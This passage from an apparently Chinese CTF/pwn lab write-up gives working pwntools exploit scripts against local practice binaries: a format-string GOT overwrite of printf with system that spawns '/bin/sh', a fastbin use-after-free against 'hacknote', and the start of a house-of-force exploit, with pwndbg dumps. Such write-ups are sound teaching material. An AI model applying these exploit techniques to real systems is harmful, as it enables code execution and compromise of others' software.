</span><span class="s1">00:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x39303425 (&#39;%409&#39;)
</span><span class="s1">01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* &#39;quit&#39; */
</span><span class="s1">02:0008│      0xffa077c8 ◂— 0x4
</span><span class="s1">03:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
</span><span class="s1">04:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
</span><span class="s1">05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
</span><span class="s1">06:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
</span><span class="s1">07:001c│      0xffa077dc —▸ 0x8048584 (play+59) ◂— nop
</span><span class="s1">08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
</span><span class="s1">09:0024│      0xffa077e4 ◂— 0x0
</span><span class="s1">0a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
</span><span class="s1">0b:002c│      0xffa077ec —▸ 0x80485b1 (main+42) ◂— nop
</span><span class="s1">0c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x0
</span><span class="s1">0d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x1
</span><span class="s1">0e:0038│      0xffa077f8 ◂— 0x0
</span><span class="s1">0f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
</span><span class="s1">10:0040│      0xffa07800 ◂— 0x1
</span><span class="s1">11:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
</span><span class="s1">12:0048│      0xffa07808 ◂— 0x0
</span><span class="s1">13:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
</span><span class="s1">14:0050│      0xffa07810 ◂— 0x1
</span><span class="s1">15:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa077dc —▸ 0x8048584 (play+59) ◂— nop
</span><span class="s1">16:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa077ec —▸ 0x80485b1 (main+42) ◂— nop
</span><span class="s1">17:005c│      0xffa0781c ◂— 0x0
</span><span class="s1">... ↓
</span><span class="s1">&#39;&#39;&#39;</span>
<span class="c1">#  gdb.attach(io, &#34;b *do_fmt+64\nc&#34;)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;%{}c%{}$hn&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">)</span>
<span class="c1">#  payload += &#34;%{}c%{}$hn&#34;.format((elf.got[&#39;printf&#39;] &amp; 0xffff + 2) - (elf.got[&#39;printf&#39;] &amp; 0xffff), 0x3b)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s2">&#34;%{}c%{}$hn&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s2">&#34;33333333</span><span class="se">\0</span><span class="s2">&#34;</span>
<span class="n">info</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;22222222&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="n">pause</span><span class="p">()</span>

<span class="s1">&#39;&#39;&#39;
</span><span class="s1">pwndbg&gt; x/3s 0x804a060
</span><span class="s1">0x804a060 &lt;buf&gt;:	&#34;</span><span class="si">%211c</span><span class="s1">%11$hhn%31&#34;...
</span><span class="s1">0x804a06f &lt;buf+15&gt;:	&#34;325c%7$hn444444&#34;...
</span><span class="s1">0x804a07e &lt;buf+30&gt;:	&#34;44&#34;
</span><span class="s1">pwndbg&gt; stack 25
</span><span class="s1">00:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x31313225 (&#39;%211&#39;)
</span><span class="s1">01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* &#39;quit&#39; */
</span><span class="s1">02:0008│      0xffa077c8 ◂— 0x4
</span><span class="s1">03:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
</span><span class="s1">04:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
</span><span class="s1">05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
</span><span class="s1">06:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
</span><span class="s1">07:001c│      0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0xf7d46930 (printf) ◂— call   0xf7e1dae9
</span><span class="s1">08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
</span><span class="s1">09:0024│      0xffa077e4 ◂— 0x0
</span><span class="s1">0a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
</span><span class="s1">0b:002c│      0xffa077ec —▸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ◂— 0xc870f7d4
</span><span class="s1">0c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x0
</span><span class="s1">0d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x1
</span><span class="s1">0e:0038│      0xffa077f8 ◂— 0x0
</span><span class="s1">0f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
</span><span class="s1">10:0040│      0xffa07800 ◂— 0x1
</span><span class="s1">11:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
</span><span class="s1">12:0048│      0xffa07808 ◂— 0x0
</span><span class="s1">13:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
</span><span class="s1">14:0050│      0xffa07810 ◂— 0x1
</span><span class="s1">15:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) ◂— 0xf7d46930
</span><span class="s1">16:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa077ec —▸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ◂— 0xc870f7d4
</span><span class="s1">17:005c│      0xffa0781c ◂— 0x0
</span><span class="s1">... ↓
</span><span class="s1">pwndbg&gt; n
</span><span class="s1">0x08048540 in do_fmt ()
</span><span class="s1">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
</span><span class="s1">────────────────────────[ REGISTERS ]────────────────────────
</span><span class="s1"> EAX  0x7b38
</span><span class="s1"> EBX  0x0
</span><span class="s1"> ECX  0xffa052a0 ◂— 0x20202020 (&#39;    &#39;)
</span><span class="s1"> EDX  0xf7eb1870 (_IO_stdfile_1_lock) ◂— 0x0
</span><span class="s1"> EDI  0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
</span><span class="s1"> ESI  0x1
</span><span class="s1"> EBP  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
</span><span class="s1"> ESP  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x31313225 (&#39;%211&#39;)
</span><span class="s1"> EIP  0x8048540 (do_fmt+69) ◂— add    esp, 0x10
</span><span class="s1">─────────────────────────[ DISASM ]──────────────────────────
</span><span class="s1">   0x804853b &lt;do_fmt+64&gt;    call   printf@plt &lt;0x80483a0&gt;
</span><span class="s1">
</span><span class="s1"> ► 0x8048540 &lt;do_fmt+69&gt;    add    esp, 0x10
</span><span class="s1">   0x8048543 &lt;do_fmt+72&gt;    jmp    do_fmt+6 &lt;0x8048501&gt;
</span><span class="s1">    ↓
</span><span class="s1">   0x8048501 &lt;do_fmt+6&gt;     sub    esp, 4
</span><span class="s1">   0x8048504 &lt;do_fmt+9&gt;     push   0xc8
</span><span class="s1">   0x8048509 &lt;do_fmt+14&gt;    push   buf &lt;0x804a060&gt;
</span><span class="s1">   0x804850e &lt;do_fmt+19&gt;    push   0
</span><span class="s1">   0x8048510 &lt;do_fmt+21&gt;    call   read@plt &lt;0x8048390&gt;
</span><span class="s1">
</span><span class="s1">   0x8048515 &lt;do_fmt+26&gt;    add    esp, 0x10
</span><span class="s1">   0x8048518 &lt;do_fmt+29&gt;    sub    esp, 4
</span><span class="s1">   0x804851b &lt;do_fmt+32&gt;    push   4
</span><span class="s1">──────────────────────────[ STACK ]──────────────────────────
</span><span class="s1">00:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x31313225 (&#39;%211&#39;)
</span><span class="s1">01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* &#39;quit&#39; */
</span><span class="s1">02:0008│      0xffa077c8 ◂— 0x4
</span><span class="s1">03:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
</span><span class="s1">04:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
</span><span class="s1">05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
</span><span class="s1">06:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
</span><span class="s1">07:001c│      0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0xf7d37b30 (system) ◂— sub    esp, 0xc
</span><span class="s1">────────────────────────[ BACKTRACE ]────────────────────────
</span><span class="s1"> ► f 0  8048540 do_fmt+69
</span><span class="s1">   f 1  804a010 _GLOBAL_OFFSET_TABLE_+16
</span><span class="s1">   f 2 f7eb0d60 _IO_2_1_stdout_
</span><span class="s1">   f 3  804a012 _GLOBAL_OFFSET_TABLE_+18
</span><span class="s1">   f 4 f7eb03dc __exit_funcs
</span><span class="s1">   f 5 ffa07810
</span><span class="s1">   f 6 f7d15276 __libc_start_main+246
</span><span class="s1">pwndbg&gt; stack 25
</span><span class="s1">00:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x31313225 (&#39;%211&#39;)
</span><span class="s1">01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* &#39;quit&#39; */
</span><span class="s1">02:0008│      0xffa077c8 ◂— 0x4
</span><span class="s1">03:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x10
</span><span class="s1">04:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d
</span><span class="s1">05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
</span><span class="s1">06:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
</span><span class="s1">07:001c│      0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0xf7d37b30 (system) ◂— sub    esp, 0xc
</span><span class="s1">08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad2887
</span><span class="s1">09:0024│      0xffa077e4 ◂— 0x0
</span><span class="s1">0a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x0
</span><span class="s1">0b:002c│      0xffa077ec —▸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ◂— 0xc870f7d3
</span><span class="s1">0c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x0
</span><span class="s1">0d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x1
</span><span class="s1">0e:0038│      0xffa077f8 ◂— 0x0
</span><span class="s1">0f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
</span><span class="s1">10:0040│      0xffa07800 ◂— 0x1
</span><span class="s1">11:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
</span><span class="s1">12:0048│      0xffa07808 ◂— 0x0
</span><span class="s1">13:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x10
</span><span class="s1">14:0050│      0xffa07810 ◂— 0x1
</span><span class="s1">15:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) ◂— 0xf7d37b30
</span><span class="s1">16:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa077ec —▸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ◂— 0xc870f7d3
</span><span class="s1">17:005c│      0xffa0781c ◂— 0x0
</span><span class="s1">... ↓
</span><span class="s1">pwndbg&gt; got
</span><span class="s1">
</span><span class="s1">GOT protection: Partial RELRO | GOT functions: 6
</span><span class="s1">
</span><span class="s1">[0x804a00c] read@GLIBC_2.0 -&gt; 0xf7dd3c50 (read) ◂— cmp    dword ptr gs:[0xc], 0
</span><span class="s1">[0x804a010] printf@GLIBC_2.0 -&gt; 0xf7d37b30 (system) ◂— sub    esp, 0xc
</span><span class="s1">[0x804a014] puts@GLIBC_2.0 -&gt; 0xf7d5c870 (puts) ◂— push   ebp
</span><span class="s1">[0x804a018] __libc_start_main@GLIBC_2.0 -&gt; 0xf7d15180 (__libc_start_main) ◂— push   ebp
</span><span class="s1">[0x804a01c] setvbuf@GLIBC_2.0 -&gt; 0xf7d5cff0 (setvbuf) ◂— push   ebp
</span><span class="s1">[0x804a020] strncmp@GLIBC_2.0 -&gt; 0xf7e3a5d0 (__strncmp_sse4_2) ◂— push   ebp
</span><span class="s1">&#39;&#39;&#39;</span>
<span class="c1">#  gdb.attach(io, &#34;b *do_fmt+64\nc&#34;)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;%{}c%{}$hhn&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xb</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s2">&#34;%{}c%{}$hn&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">((</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">),</span> <span class="mh">0x7</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;44444444</span><span class="se">\0</span><span class="s1">&#39;</span>
<span class="n">info</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;33333333&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="n">pause</span><span class="p">()</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;44444444&#34;</span><span class="p">,</span> <span class="s2">&#34;/bin/sh</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><blockquote>
<p>可以通过设置标记变量(如我 exp 中的 11111111, 22222222 等)进行输入输出的定位</p>
</blockquote>
<h3 id="lab10-hacknote">lab10-hacknote</h3>
<p>最简单的一种 fastbin uaf 利用，结构体中有函数指针，通过 uaf 控制该函数指针指向 magic 函数即可，uaf 的介绍可以看这个 <a href="https://github.com/M4xW4n9/slides/blob/master/pwn_heap/malloc-150821074656-lva1-app6891.pdf"><strong>slide</strong></a></p>
<p>exp:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">lab10</span> <span class="p">[</span><span class="n">master</span><span class="err">●</span><span class="p">]</span> <span class="n">cat</span> <span class="n">solve</span><span class="o">.</span><span class="n">py</span> 
<span class="c1">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;debug&#34;</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;deepin-terminal&#34;</span><span class="p">,</span> <span class="s2">&#34;-x&#34;</span><span class="p">,</span> <span class="s2">&#34;sh&#34;</span><span class="p">,</span> <span class="s2">&#34;-c&#34;</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">debug</span><span class="p">():</span>
    <span class="nb">raw_input</span><span class="p">(</span><span class="s2">&#34;DEBUG: &#34;</span><span class="p">)</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./hacknote&#34;</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./hacknote&#34;</span><span class="p">)</span>
<span class="n">magic_elf</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;magic&#34;</span><span class="p">]</span>


<span class="k">def</span> <span class="nf">addNote</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;choice :&#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;size &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Content :&#34;</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">delNote</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="c1">#  debug()</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;choice :&#34;</span><span class="p">,</span> <span class="s2">&#34;2&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Index :&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">printNote</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="c1">#  debug()</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;choice :&#34;</span><span class="p">,</span> <span class="s2">&#34;3&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;Index :&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">uaf</span><span class="p">():</span>
    <span class="n">addNote</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="s2">&#34;a&#34;</span> <span class="o">*</span> <span class="mi">24</span><span class="p">)</span>
    <span class="n">addNote</span><span class="p">(</span><span class="mi">24</span><span class="p">,</span> <span class="s2">&#34;b&#34;</span> <span class="o">*</span> <span class="mi">24</span><span class="p">)</span>

    <span class="n">delNote</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">delNote</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="c1">#  debug()</span>
    <span class="n">addNote</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="n">p32</span><span class="p">(</span><span class="n">magic_elf</span><span class="p">))</span>

    <span class="n">printNote</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
    <span class="n">uaf</span><span class="p">()</span>
    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
    <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><blockquote>
<p>说一下怎么修复 IDA 中的结构体</p>
<p>识别出结构体的具体结构后</p>
<ul>
<li>
<p>shift+F1, insert 插入识别出的结果</p>
<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq30oi6hn6j30qt0hgjsc.jpg" alt=""></p>
</li>
<li>
<p>shift+F9, insert 导入我们刚添加的 local type</p>
<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq30podbi2j31490m8jwq.jpg" alt=""></p>
</li>
<li>
<p>然后我们在结构体变量上 y 一下，制定其数据类型即可</p>
<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq30qp97hyj30nn06zt9k.jpg" alt=""></p>
</li>
<li>
<p>修复的效果图如下：</p>
<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fq30rb5bzyj30gd03lmxn.jpg" alt=""></p>
</li>
</ul>
</blockquote>
<h3 id="lab11-bamboobox">lab11-bamboobox</h3>
<p>可以种 house of force，也可以使用 unsafe unlink，先说 house of force 的方法</p>
<h4 id="house-of-force">house of force</h4>
<p>简单说一下我对 hof 的理解，如果我们能控制 <strong>top_chunk</strong> 的 <strong>size</strong>，那么我们就可以通过控制 malloc 一些精心设计的<strong>大数/负数</strong>来实现控制 top_chunk 的指针，就可以实现任意地址写的效果，个人感觉，hof 的核心思想就在这个 force 上，疯狂 malloc，简单粗暴效果明显</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">lab11</span> <span class="p">[</span><span class="n">master</span><span class="err">●</span><span class="p">]</span> <span class="n">cat</span> <span class="n">hof</span><span class="o">.</span><span class="n">py</span> 
<span class="c1">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">zio</span> <span class="kn">import</span> <span class="n">l64</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;debug&#34;</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;deepin-terminal&#34;</span><span class="p">,</span> <span class="s2">&#34;-x&#34;</span><span class="p">,</span> <span class="s2">&#34;sh&#34;</span><span class="p">,</span> <span class="s2">&#34;-c&#34;</span><span class="p">]</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./bamboobox&#34;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">DEBUG</span><span class="p">():</span>
	<span class="nb">raw_input</span><span class="p">(</span><span class="s2">&#34;DEBUG: &#34;</span><span class="p">)</span>
	<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;2&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">length</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">change</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;3&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">length</span><span class="p">))</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">exit</span><span class="p">():</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;5&#34;</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
    <span class="n">add</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x60</span><span class="p">))</span>
    <span class="c1">#  DEBUG()</span>
